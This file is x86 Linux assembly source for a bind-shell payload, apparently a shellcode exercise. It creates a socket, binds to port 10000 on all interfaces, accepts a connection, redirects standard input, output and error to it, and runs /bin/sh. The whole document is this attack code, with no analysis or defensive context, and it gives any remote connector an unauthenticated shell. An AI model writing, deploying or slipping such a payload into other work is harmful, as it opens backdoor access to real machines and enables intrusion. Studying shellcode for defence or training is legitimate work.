global _start

section .data
portNo:dw 10000
sock_stream: db 1
sin_family:dw 2
sin_port:dw 0x1027
sin_addr:db 0x0,0x0,0x0,0x0 ;INADDR_ANY
server_padding:db 0,0,0,0,0,0,0,0
size equ  $-sin_family
client_family:dw 0x2
client_port:dw 0x0
client_addr:db 0x0,0x0,0x0,0x0
client_padding:db 0,0,0,0,0,0,0,0
client_size:db $-client_family
shell:db "/bin/sh"

section .text
_start:

Socket:
mov ax,359
mov bl, 2
mov cl, 1
mov edx,0
int 0x80
mov bl,al  ;move socket value in bl

;int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
Bind:
xor eax,eax
mov ax,361
xor ecx,ecx
push ecx
push ecx
push ecx
push 0x1027
push word 2
mov ecx, esp
mov dl, 16
int 0x80

Listen:
xor eax,eax
mov ax,363
mov cl,10
int 0x80

;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
Accept:
mov ax,364
;mov bl,[sockfd]
mov ecx, client_family
mov edx, client_size
int 0x80
mov ebx, eax

CopyDescriptors:
mov al, 63
xor ecx,ecx
mov cl, 0
int 0x80

; dup system call
mov al, 63
xor ecx,ecx
mov cl, 1
int 0x80


mov al, 63
xor ecx,ecx
mov cl, 2
int 0x80


xor eax,eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
push ebx
mov ecx, esp
mov edx, 0
mov al,11
int 0x80

